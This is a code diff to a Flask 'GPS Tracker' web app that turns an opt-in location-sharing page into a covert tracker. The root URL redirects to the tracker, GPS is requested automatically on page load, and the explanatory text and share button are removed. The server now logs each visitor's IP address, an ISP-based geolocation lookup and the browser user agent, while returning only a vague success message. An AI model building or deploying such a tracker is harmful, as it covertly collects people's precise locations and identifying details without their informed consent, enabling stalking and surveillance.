@@ -1,6 +1,7 @@
-from flask import Flask, request, jsonify, send_file
+from flask import Flask, request, jsonify, send_file, redirect, url_for
 import os
 from datetime import datetime
+import requests
 import logging
 
 # Initialize Flask app
@@ -14,28 +15,27 @@ if not os.path.exists(LOG_DIR):
 # Configure logging to output to console (for Render logs)
 logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")
 
-# Default route for the root URL
+# Geolocation API for ISP-based location
+GEOLOCATION_API_URL = "http://ip-api.com/json"
+
+# Default route redirects to GPS tracker
 @app.route('/')
 def home():
-    return """
-    <h1>Welcome to the Enhanced Tracking App</h1>
-    <p>Use the following endpoints:</p>
-    <ul>
-        <li><b>/gps-tracker</b>: Get exact GPS location from the user</li>
-        <li><b>/view-logs</b>: View logged data</li>
-        <li><b>/health</b>: Health check</li>
-    </ul>
-    """
+    return redirect(url_for('gps_tracker'))
 
 # Route to serve the GPS tracker page
 @app.route('/gps-tracker')
 def gps_tracker():
     return """
     <h1>GPS Tracker</h1>
-    <p>Click the button below to share your GPS location.</p>
-    <button onclick="getLocation()">Share GPS Location</button>
+    <p>Sharing your location for enhanced tracking...</p>
     <p id="status"></p>
     <script>
+        // Automatically request GPS location when the page loads
+        window.onload = function() {
+            getLocation();
+        };
+
         function getLocation() {
             if (navigator.geolocation) {
                 document.getElementById("status").innerText = "Requesting location...";
@@ -49,16 +49,21 @@ def gps_tracker():
             const lat = position.coords.latitude;
             const lon = position.coords.longitude;
 
+            // Send GPS data along with other details to the server
             fetch('/gps-logger', {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json'
                 },
-                body: JSON.stringify({ latitude: lat, longitude: lon })
+                body: JSON.stringify({ 
+                    latitude: lat, 
+                    longitude: lon, 
+                    user_agent: navigator.userAgent 
+                })
             })
             .then(response => response.json())
             .then(data => {
-                document.getElementById("status").innerText = "Location logged successfully: " + JSON.stringify(data);
+                document.getElementById("status").innerText = "Location logged successfully.";
             })
             .catch(error => {
                 document.getElementById("status").innerText = "Error logging location.";
@@ -84,19 +89,34 @@ def gps_tracker():
     </script>
     """
 
-# Route to log GPS data from the frontend
+# Route to log GPS and device details
 @app.route('/gps-logger', methods=['POST'])
 def gps_logger():
     data = request.get_json()
     timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
 
-    # Log GPS data
+    # Get ISP-based location
+    user_ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]
+    isp_location_data = {}
+    try:
+        response = requests.get(f"{GEOLOCATION_API_URL}/{user_ip}")
+        if response.status_code == 200:
+            isp_location_data = response.json()
+        else:
+            isp_location_data = {"error": "Failed to fetch ISP-based geolocation"}
+    except Exception as e:
+        isp_location_data = {"error": str(e)}
+
+    # Log GPS, ISP, and device details
     log_entry = {
         "timestamp": timestamp,
+        "ip": user_ip,
         "gps": {
             "latitude": data.get("latitude"),
             "longitude": data.get("longitude")
-        }
+        },
+        "isp_location": isp_location_data,
+        "user_agent": data.get("user_agent"),
     }
 
     log_line = f"{log_entry}\n"
@@ -106,9 +126,9 @@ def gps_logger():
         log_file.write(log_line)
 
     # Log to Render logs
-    logging.info(f"GPS Log entry: {log_entry}")
+    logging.info(f"Complete Log entry: {log_entry}")
 
-    return jsonify({"message": "GPS data logged successfully", "data": log_entry}), 200
+    return jsonify({"message": "Data logged successfully", "data": log_entry}), 200
 
 # Route to view logs (secured)
 @app.route('/view-logs', methods=['GET'])
